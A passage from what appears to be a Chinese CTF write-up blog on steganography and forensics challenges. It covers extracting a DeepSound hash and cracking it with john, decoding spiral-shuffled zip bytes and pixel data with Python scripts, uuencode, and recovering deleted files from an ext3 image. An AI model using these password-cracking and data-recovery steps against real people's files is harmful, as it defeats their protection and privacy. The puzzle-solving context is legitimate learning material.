class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s:$dynamic_1529$%s&#x27;</span> % (bname, sha1.<span class="hljs-built_in">hex</span>()))<br> <br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  <span class="hljs-keyword">import</span> argparse<br> <br>  parser = argparse.ArgumentParser()<br>  parser.add_argument(<span class="hljs-string">&#x27;--verbose&#x27;</span>, <span class="hljs-string">&#x27;-v&#x27;</span>, action=<span class="hljs-string">&#x27;store_true&#x27;</span>)<br>  parser.add_argument(<span class="hljs-string">&#x27;files&#x27;</span>, nargs=<span class="hljs-string">&#x27;+&#x27;</span>, metavar=<span class="hljs-string">&#x27;file&#x27;</span>,<br>    <span class="hljs-built_in">type</span>=argparse.FileType(<span class="hljs-string">&#x27;rb&#x27;</span>, bufsize=<span class="hljs-number">4096</span>))<br>  args = parser.parse_args()<br> <br>  <span class="hljs-keyword">if</span> args.verbose:<br>    logging.basicConfig(level=logging.INFO)<br>  <span class="hljs-keyword">else</span>:<br>    logging.basicConfig(level=logging.WARN)<br> <br>  convert_warn = <span class="hljs-literal">False</span><br> <br>  <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> args.files:<br>    process_deepsound_file(f)<br> <br>  <span class="hljs-keyword">if</span> convert_warn:<br>    <span class="hljs-built_in">print</span>(textwrap.dedent(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    ---------------------------------------------------------------</span><br><span class="hljs-string">    Some files were not in .wav format. Try converting them to .wav</span><br><span class="hljs-string">    and try again. You can use: ffmpeg -i input output.wav</span><br><span class="hljs-string">    ---------------------------------------------------------------</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>.rstrip()), file=sys.stderr)<br></code></pre></td></tr></table></figure><p>使用脚本获取哈希值，借用kali的john来爆破密码。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 deepsound2john<span class="hljs-selector-class">.py</span> voipNewRing<span class="hljs-selector-class">.wav</span> &gt; <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">john</span> <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><p>得到密码为feedback，经过deepsound解密得到key.txt</p><p>e575ac894c385a6f</p><p>利用ftk挂载。在回收站发现了</p><p>$RDWTTK4</p><p>根据key.txt分析猜到加密文件是一个veracrypt。将其作为密码得到一个“spiral”</p><p>上网搜索为螺旋的意思，而且是zip的格式。但是结尾和文件整体很怪。在网上发现螺旋算法。找到解密脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">function</span>(<span class="hljs-params">n</span>):<br>    matrix = [[<span class="hljs-number">0</span>] * n <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n)]<br><br>    number = <span class="hljs-number">1</span><br>    left, right, up, down = <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> left &lt; right <span class="hljs-keyword">and</span> up &lt; down:<br>        <span class="hljs-comment"># 从左到右</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(left, right):<br>            matrix[up][i] = number<br>            number += <span class="hljs-number">1</span><br><br>        <span class="hljs-comment"># 从上到下</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(up, down):<br>            matrix[i][right] = number<br>            number += <span class="hljs-number">1</span><br><br>        <span class="hljs-comment"># 从右向左</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(right, left, -<span class="hljs-number">1</span>):<br>            matrix[down][i] = number<br>            number += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(down, up, -<span class="hljs-number">1</span>):<br>            matrix[i][left] = number<br>            number += <span class="hljs-number">1</span><br>        left += <span class="hljs-number">1</span><br>        right -= <span class="hljs-number">1</span><br>        up += <span class="hljs-number">1</span><br>        down -= <span class="hljs-number">1</span><br>    <span class="hljs-comment"># n 为奇数的时候，正方形中间会有个单独的空格需要单独填充</span><br>    <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>: <br>        matrix[n // <span class="hljs-number">2</span>][n // <span class="hljs-number">2</span>] = number<br>    <span class="hljs-keyword">return</span> matrix<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;spiral.zip&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    s = function(<span class="hljs-number">87</span>)<br>    <br>    s = <span class="hljs-built_in">sum</span>(s, [])<br>    <br>    f1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;fla.zip&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>    arr = [<span class="hljs-number">0</span>] * <span class="hljs-number">7569</span><br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>        arr[i] = f[s[i]-<span class="hljs-number">1</span>]<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arr:<br>        f1.write(<span class="hljs-built_in">bytes</span>([i]))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>得到一张png图片</p><p>去掉开头，发现有49个字符，经过怕方格排序，螺旋得出flag。</p><h3 id="GDOUCTF-2023-pixelart"><a href="#GDOUCTF-2023-pixelart" class="headerlink" title="[GDOUCTF 2023]pixelart"></a>[GDOUCTF 2023]pixelart</h3><p>图片打开后会发现许多像素点，在010中发现最后要求图片为320*180.</p><p>得知是将原来的像素为12*12提取。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>im = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;arcaea.png&#x27;</span>)<br>pix = im.load()<br>width = im.size[<span class="hljs-number">0</span>]<br>height = im.size[<span class="hljs-number">1</span>]<br><span class="hljs-comment"># 新图像的宽度和高度（每12个像素生成一个新像素）</span><br>new_width = width // <span class="hljs-number">12</span><br>new_height = height // <span class="hljs-number">12</span><br><br><span class="hljs-comment"># 创建一个新的图像对象</span><br>new_img = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (new_width, new_height))<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, width, <span class="hljs-number">12</span>):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, height, <span class="hljs-number">12</span>):<br>        rgb = pix[x, y]<br>        new_img.putpixel((x // <span class="hljs-number">12</span>, y // <span class="hljs-number">12</span>), (<span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">0</span>]), <span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">1</span>]), <span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">2</span>])))<br>new_img.save(<span class="hljs-string">&#x27;new_image.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到假的flag ，再将得到的图片经过zsteg梭哈得到真正的flag。</p><h3 id="CISCN-2018-Picture"><a href="#CISCN-2018-Picture" class="headerlink" title="CISCN 2018]Picture"></a>CISCN 2018]Picture</h3><p>附件下载后是一个图片，经010分析后没有任何发现，</p><p>binwalk分离两个文件其中一个是base64编码，发现</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs lasso">KP<span class="hljs-params">...</span><span class="hljs-params">...</span>.<span class="hljs-number">.90</span>.Llã.|Z<span class="hljs-params">...</span>N<span class="hljs-params">...</span><span class="hljs-params">...</span>.codeãÞ.ð.®Gg.Á¶.¿:ü.Ç¥<span class="hljs-number">-.2</span> «GÛ<span class="hljs-number">6</span>Õ³øÝ*¦zÂþ¡.¨çIcÏ.ÈrÚ±<span class="hljs-string">&quot;ÄÇWn~ÖdÄîñ\öy!H.íý.¬r).©&#123;.¢.oí.êtK».TòfÿÃPK..?.......90.Llã.|Z...N.....$....... .......code</span><br><span class="hljs-string">. ..........[Ã..ÚÓ.&lt;...ÚÓ.&lt;...ÚÓ.PK..........V...|...Ü.[Python 2.7]</span><br><span class="hljs-string"></span><br><span class="hljs-string">&gt;&gt;&gt; ¨&#125;¨&#125;¨&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Traceback (most recent call last):</span><br><span class="hljs-string">  File &quot;</span>&lt;pyshell#0&gt;<span class="hljs-string">&quot;, line 1, in &lt;module&gt;</span><br><span class="hljs-string">    ¨&#125;¨&#125;¨&#125;</span><br><span class="hljs-string">ZeroDivisionError: ¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125;¨&#125; &lt;- password ;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">&gt;&gt;&gt; .</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>文件头是错的，应该是个zip文件，然后Unicode转文本，得到16进制吗，转换得到压缩包，密码根据提示，是一个py的错误提示。</p><p>然后解压缩后得到</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">begin <span class="hljs-number">644</span> key.txt<br><span class="hljs-title class_">G0TE30TY</span>[,C,X.<span class="hljs-variable">$%</span>&amp;,C<span class="hljs-variable">@Y</span>,<span class="hljs-title class_">T5</span><span class="hljs-string">&quot;.#5%0C%&quot;</span>-<span class="hljs-comment">#,Y04)&amp;1C8Q-S,Q.49]</span><br>`<br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure><p>搜索得到是一个uuencode编码，直接kali梭哈得到flag。</p><h3 id="安洵杯-2020-王牌特工"><a href="#安洵杯-2020-王牌特工" class="headerlink" title="[安洵杯 2020]王牌特工"></a>[安洵杯 2020]王牌特工</h3><p>文件得到findme</p><p>Linux 在file findme得到了是⼀个 ext3 的磁盘 ，</p><p>在kali使用mount挂载，使用mkdir创建文件夹，然后使用</p><p>mount findme &#x2F;mnt&#x2F;c&#x2F;Users&#x2F;86157&#x2F;Desktop&#x2F;新建文件夹2&#x2F;1  进行挂载。</p><p>发现了       flagbox   key.txt lost+found</p><p>得到查看key.txt </p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">key</span>:a_cool_key<br><span class="hljs-keyword">use</span> Veracrypt<br></code></pre></td></tr></table></figure><p>根据提示使用veracrypt工具</p><p>然后得到一个假的flag，提示回头看看。</p><p>然后使用df检查磁盘空间占用情况</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs tap"> df<br>文件系统           1K的块      已用      可用 已用% 挂载点<br>none             <span class="hljs-number"> 3858572 </span>       <span class="hljs-number"> 4 </span> <span class="hljs-number"> 3858568 </span>   1% /mnt/wsl<br>none           <span class="hljs-number"> 209716220 </span>113044452 <span class="hljs-number"> 96671768 </span>  54% /usr/lib/wsl/drivers<br>none             <span class="hljs-number"> 3858572 </span>       <span class="hljs-number"> 0 </span> <span class="hljs-number"> 3858572 </span>   0% /usr/lib/wsl/lib<br>/dev/sdc      <span class="hljs-number"> 1055762868 </span><span class="hljs-number"> 21173420 </span>980885976    3% /<br>none             <span class="hljs-number"> 3858572 </span>     <span class="hljs-number"> 392 </span> <span class="hljs-number"> 3858180 </span>   1% /mnt/wslg<br>rootfs           <span class="hljs-number"> 3855328 </span>    <span class="hljs-number"> 1936 </span> <span class="hljs-number"> 3853392 </span>   1% /init<br>none             <span class="hljs-number"> 3855356 </span>       <span class="hljs-number"> 0 </span> <span class="hljs-number"> 3855356 </span>   0% /dev<br>none             <span class="hljs-number"> 3858572 </span>     <span class="hljs-number"> 444 </span> <span class="hljs-number"> 3858128 </span>   1% /run<br>none             <span class="hljs-number"> 3858572 </span>       <span class="hljs-number"> 0 </span> <span class="hljs-number"> 3858572 </span>   0% /run/lock<br>none             <span class="hljs-number"> 3858572 </span>       <span class="hljs-number"> 0 </span> <span class="hljs-number"> 3858572 </span>   0% /run/shm<br>none             <span class="hljs-number"> 3858572 </span>       <span class="hljs-number"> 0 </span> <span class="hljs-number"> 3858572 </span>   0% /run/user<br>tmpfs            <span class="hljs-number"> 3858572 </span>       <span class="hljs-number"> 0 </span> <span class="hljs-number"> 3858572 </span>   0% /sys/fs/cgroup<br>none             <span class="hljs-number"> 3858572 </span>      <span class="hljs-number"> 76 </span> <span class="hljs-number"> 3858496 </span>   1% /mnt/wslg/versions.txt<br>none             <span class="hljs-number"> 3858572 </span>      <span class="hljs-number"> 76 </span> <span class="hljs-number"> 3858496 </span>   1% /mnt/wslg/doc<br>drvfs          <span class="hljs-number"> 209716220 </span>113044452 <span class="hljs-number"> 96671768 </span>  54% /mnt/c<br>drvfs          <span class="hljs-number"> 288059388 </span>194470144 <span class="hljs-number"> 93589244 </span>  68% /mnt/d<br>/dev/loop0          <span class="hljs-number"> 8809 </span>    <span class="hljs-number"> 1049 </span>    <span class="hljs-number"> 7248 </span>  13% /mnt/c/Users/86157/Desktop/新建文件夹2/1<br></code></pre></td></tr></table></figure><p>猜测是有两个文件被删除了。然后使用磁盘恢复数据软件 extundelete</p><p>extundelete &#x2F;dev&#x2F;loop0 inode 2</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">File name                                       | Inode number | Deleted status<br><span class="hljs-bullet">.                                                 </span>2<br><span class="hljs-bullet">..                                                </span>2<br>lost+found                                        11<br>flagbox                                           12<br>key.txt                                           13<br><span class="hljs-title">.coolboy.swp                                      14             Deleted</span><br><span class="hljs-title">.coolboy.swpx                                     15             Deleted</span><br><br><br></code></pre></td></tr></table></figure><p>猜测是 .coolboy.swp </p><p>extundelete &#x2F;dev&#x2F;loop0 –restore-file .coolboy.swp</p><p> cd RECOVERED_FILES</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">strings .coolboy.swp<br>b0VIM 8.2<br>root<br>kali<br>~root/cool/coolboy<br>U3210<br><span class="hljs-comment">#&quot;!</span><br>you <span class="hljs-built_in">find</span> me<br>55yf55qE5a+<span class="hljs-attribute">G56CBOnRoaXNfaXNfYV90cnVlX2tleQ</span>==<br></code></pre></td></tr></table></figure><p>然后得到真的密码，进行解密。</p><p>you_are_a_cool_boy</p><h3 id="羊城杯-2023-ai和nia的交响曲"><a href="#羊城杯-2023-ai和nia的交响曲" class="headerlink" title="[羊城杯 2023]ai和nia的交响曲"></a>[羊城杯 2023]ai和nia的交响曲</h3><p>文件打开是一个流量包，直接过滤HTTP发现一个上传了png一个含有flag.zip</p><p>导出http进行提取压缩包，经过测试将两个08均改为00即可解开伪加密。然后进行发现有零宽字符的txt文件，</p><p>解密得到提示，我们不得不回去找到图片，导出后发现了是关于像素的图片利用脚本进行解密</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">from</span> PIL import Image<br><br>im = Image.<span class="hljs-meta">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br>pix = im.load()<br>width = im.size[0]<br>height = im.size[1]<br><span class="hljs-keyword">end</span>=<span class="hljs-string">&#x27;&#x27;</span><br>for <span class="hljs-keyword">x</span> <span class="hljs-keyword">in</span> <span class="hljs-meta">range</span>(width):<br>    for y <span class="hljs-keyword">in</span> <span class="hljs-meta">range</span>(height):<br>        r, g, b = pix[<span class="hljs-keyword">x</span>, y]<br>        <span class="hljs-keyword">if</span> r&gt;200:<br>            <span class="hljs-keyword">end</span>+=<span class="hljs-string">&#x27;1&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">end</span>+=<span class="hljs-string">&#x27;0&#x27;</span><br>txt = <span class="hljs-string">&#x27;&#x27;</span>.joi<span class="hljs-meta">n</span>([chr(<span class="hljs-meta">int</span>(<span class="hljs-keyword">end</span>[i:i+8], 2)) for i <span class="hljs-keyword">in</span> <span class="hljs-meta">range</span>(0, le<span class="hljs-meta">n</span>(<span class="hljs-keyword">end</span>), 8)])<br><br>with <span class="hljs-meta">open</span>(<span class="hljs-string">&#x27;13141243211.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-keyword">file</span> :<br>    <span class="hljs-keyword">file</span>.write(txt)<br></code></pre></td></tr></table></figure><p> 直接将像素为200以上的为1其余为0，得到文件</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">(&gt;+UGfo+F^ia3#&#123;JTlB:K:]@<span class="hljs-constructor">LW()</span>ak-AaaTk`@/L&amp;<span class="hljs-number">2</span>V2M!(nh#<span class="hljs-string">&quot;,5&amp;Tj=Mt0x*C%=9B4*G&lt;USiGR&quot;</span>eOGW&#123;SY%<span class="hljs-number">5</span>TQBR+.-wtAgX#w]eiE1@JyL<span class="hljs-string">&quot;WXfgcs|2I7kEW5_q`81U10k-3AkaLQT-0R,&quot;</span>BaHy&#x27;gsYBN@<span class="hljs-constructor">$_hBjY(Xg3|<span class="hljs-params">j1S</span>:KJs`#.<span class="hljs-params">mMWal2e9</span>&lt;<span class="hljs-params">yA</span>-?<span class="hljs-params">c5t</span>(2D~T<span class="hljs-params">$K</span>?<span class="hljs-params">ht</span>|QuO1Q?T?<span class="hljs-params">mr</span>|<span class="hljs-params">uj</span>@<span class="hljs-params">o3kP</span>(<span class="hljs-params">nDiDU7H</span>;6EUv7L2mmFF1&#x27;&lt;$O31Yc&amp;%<span class="hljs-params">q</span>+Ea<span class="hljs-params">$Y</span>|<span class="hljs-operator">/</span><span class="hljs-params">ixY</span>&amp;<span class="hljs-params">ta</span><span class="hljs-operator">/</span>ZL`&amp;0[&gt;<span class="hljs-params">sL</span>[Up=2FP#6l8:~<span class="hljs-params">gM$u</span>+<span class="hljs-params">nr</span>&amp;~<span class="hljs-params">cgWLExGQ</span>.<span class="hljs-params">_4BfVh</span><span class="hljs-operator">/</span><span class="hljs-params">uIaJW0my0</span>\E2SO&#x27;&amp;D|8B<span class="hljs-string">&quot;&amp;gF?b.e^3gZA2!?*P&lt;f&#125;G?8Bpj:!-nc@zA7Uz5(^SOZj,u&#x27;+#Q&#x27;09xiE%tJ:5~vm&#123;FX&amp;I&gt;d6*((+]2sl2s-Z4Fv!A!*|?eP$#-[01P]hia/B_iCS//CjE&#125;HlLV),`&amp;gkJ/iZR-WzS&#125;R|&#123;+Na|&#125;3t;/$mhHiJk$%4rtS]wMpFV&quot;</span><span class="hljs-params">vAe</span>&#123;<span class="hljs-params">p</span>^^Y7<span class="hljs-operator">/</span><span class="hljs-params">iDW</span>,|1<span class="hljs-string">&quot;.@,$%o&amp;$3.+,&quot;</span>$MKjhYoXJs<span class="hljs-operator">*</span><span class="hljs-params">g_e</span>!#F8y&#123;<span class="hljs-params">kZV</span>\,;<span class="hljs-params">jtW</span>&#125;S&#125;7(VmRDQZ&#125;Yu\7<span class="hljs-string">&quot;8yuWXk^:b4)1,&#123;wb;JN`^hL5M|71yrt;a&lt;\9`whLz&#123;Xt.UZ/&#125;5U!@2r0^&quot;</span>UI!&gt;<span class="hljs-params">gGk0</span>&lt;JiaDa;<span class="hljs-params">__IMSOgmaOI</span><span class="hljs-string">&quot;72YHWlZ/wI9@gm!rkN$$f(Tn~,9$fn&#123;GFK2qGjo$Zr^$mr0l0&gt;+jd~&lt;|ZepEBN]_pS4P,v`JQdKG?g*a#*0yID4ySTT|aqY8]Qc8TNa`.j\)5vq0!d60Acr&amp;A1&lt;h&#123;.&#x27;&#123;c%2SS&#x27;cq**,1yN*Kb#(0WLUlu\$O&gt;p&#123;=[q,zuGTTm5|=5AY/([9?vREwI^U&gt;]mV7R@1XoQn1^hF_OY&lt;bp&quot;</span><span class="hljs-params">jD</span>)</span><span class="hljs-number">3</span>U_d&#123;hI7&#125;)IR,GWWsa7yi@<span class="hljs-number">8</span>tk*GSk8sIJ`m9]aY%qOk*zsUh0:Gg8)+R#I&gt;j-O21dV%bgPfT%&#123;+-oWs&#123;._M)_qSg4wOS2Phz&amp;lNQ9G%N*~]BRcbkUUwK)yc]P0tJ!Eg$^ca4(;p+*b&lt;`~fXW\<span class="hljs-number">1</span>Znp.&lt;Ph#LR&amp;#&lt;eOY)<span class="hljs-number">8</span>qd&amp;<span class="hljs-number">28</span>&gt;sLhmi+:r=N`VLMz@&#125;*TrZ6$<span class="hljs-number">9</span>c;<span class="hljs-number">85</span>(!<span class="hljs-string">&quot;:oa(\7ap1hSIdhV9,isjADx5C5s]#JpZa&lt;7~valGCooV(t_i3DKZ&gt;in#]C&#x27;nQde/[8x[Brl]_@;,5:g[8e7MG&#x27;:,NT&gt;EM+jFUgV6H[WMo$ec&lt;i:#rLV:9hr;%Z,r6CK1y4K7(UUh$cvNPpa6T1Xh@+@.~ySa@|IBR?[&#x27;;OtU(iKr=f&gt;HxL=+Ivx&#123;?shL%|UJcw765%qe&amp;zBH/2EfE+cYZI(DI&#x27;&#123;s~&amp;,&quot;</span><span class="hljs-literal">[I&gt;&quot;EYC<span class="hljs-identifier">s0Sby</span>=&#123;@QZ<span class="hljs-identifier">_hC</span>.<span class="hljs-identifier">sr</span>&#x27;<span class="hljs-number">0</span>)<span class="hljs-identifier">_IL_Fp</span>^;OXT4^;&#125;<span class="hljs-operator">*</span>A<span class="hljs-identifier">lA</span>(<span class="hljs-identifier">o_TuW7L92Q</span>&quot;+C<span class="hljs-identifier">r3</span>&quot;LG!<span class="hljs-identifier">uNKb</span>&#x27;Q^<span class="hljs-identifier">_</span>:C~UX%\^%<span class="hljs-identifier">b</span>&#123;O8<span class="hljs-identifier">t</span>&amp;<span class="hljs-identifier">aDk</span>:&lt;<span class="hljs-identifier">tV</span><span class="hljs-operator">*</span>I%<span class="hljs-identifier">lI</span>`]</span>dE&#x27;@:+U:cR-!x6&amp;<span class="hljs-number">1</span>&#125;HB&amp;OIC7_gz.<span class="hljs-number">4</span>;o5/)Qaj2T:Z)KdZ1&lt;.UR=gnaa(;BOp@cpEcdZ&amp;T^<span class="hljs-number">6</span>&gt;qab<span class="hljs-string">&quot;kM#53S9Uv6,&lt;pt@&#125;A)G,:^#y*ciDz!s]@lQNLW&quot;</span>WHOa77@<span class="hljs-number">5</span>#*&lt;OrD0/`a^&amp;kya&lt;J9]<span class="hljs-pattern-match">|=]<span class="hljs-constructor">F</span>,g<span class="hljs-constructor">HVU$</span>,<span class="hljs-constructor">F81d</span>&#x27;<span class="hljs-constructor">HQL</span>!3.<span class="hljs-constructor">P9U</span>~ym;<span class="hljs-constructor">B</span>,<span class="hljs-constructor">PJQx</span>;&#125;<span class="hljs-constructor">Zo</span>&#x27;,n<span class="hljs-constructor">KwJDb</span>&quot;r-0=<span class="hljs-constructor">$2</span>&#123;w<span class="hljs-constructor">B</span>&lt;<span class="hljs-constructor">OwRO</span>[:)c<span class="hljs-constructor">FuX</span><span class="hljs-operator">*</span><span class="hljs-constructor">WU</span>^<span class="hljs-constructor">MIIr4</span>+-0<span class="hljs-constructor">Q</span>.6,<span class="hljs-constructor">WnwLKN</span>@ks1<span class="hljs-constructor">P</span>&#125;f<span class="hljs-constructor">SFMFdi</span>)0.@m<span class="hljs-constructor">X</span>+jm5wnkaa-&gt;]o,<span class="hljs-constructor">K</span>]<span class="hljs-constructor">R2ll</span>&gt;<span class="hljs-constructor">V</span>?@&amp;!&quot;zh<span class="hljs-constructor">W9</span>`5!<span class="hljs-constructor">PF_</span>+y,&lt;&gt;2<span class="hljs-constructor">FL</span>?`&gt;ong<span class="hljs-constructor">CE5</span>&quot;<span class="hljs-constructor">R</span>^<span class="hljs-constructor">MT(Val_[+<span class="hljs-params">vjeBg</span>+RX&amp;6.[<span class="hljs-params">bx</span>&gt;<span class="hljs-params">ag</span>,7T+02<span class="hljs-params">$rvn6r</span>~&#123;<span class="hljs-params">ru</span>|HA2a@2|<span class="hljs-params">s</span><span class="hljs-operator">*</span>#2pj,<span class="hljs-params">aH0l</span>;<span class="hljs-params">eI</span>]B<span class="hljs-params">~vII</span><span class="hljs-string">&quot;@QRY]5HGy&#123;LE`QgFcNj@oV]s0GTq&#125;MgIGX9AK&gt;?UiFg)3&amp;ez&#125;TVH),QPA6#Tma&lt;b&lt;B/sc,fx&#123;C4YG5M)]vAwR&amp;,&quot;</span><span class="hljs-string">&quot;]q:_l4!;UuE&#125;iW&quot;</span>$<span class="hljs-params">hKFXL_ta</span>=4Rpw8jrk+NwLVrmcl2<span class="hljs-string">&quot;wozIQ/z/s7:*yz?2A^w.W7+-(&lt;%-0&#x27;Q#+&#x27;u,jZOS^(5zU7Az@cn-!:jpB8?G&#125;f&lt;P*?!2AZg3^e.b?Fg&amp;&quot;</span>B8|D&amp;&#x27;OS2E\0ym0WJaIu<span class="hljs-operator">/</span><span class="hljs-params">hVfB4_</span>.QGxELWgc~&amp;<span class="hljs-params">rn</span>+<span class="hljs-params">u$Mg</span>~:8l6#PF2=<span class="hljs-params">pU</span>[Ls&gt;[0&amp;`LZ<span class="hljs-operator">/</span><span class="hljs-params">at</span>&amp;Yxi<span class="hljs-operator">/</span>|Y<span class="hljs-params">$aE</span>+<span class="hljs-params">q</span>%&amp;<span class="hljs-params">cY13O$</span>&lt;&#x27;1FFmm2L7vUE6;H7UDiDn(Pk3o@<span class="hljs-params">ju</span>|<span class="hljs-params">rm</span>?T?Q1OuQ|<span class="hljs-params">th</span>?K<span 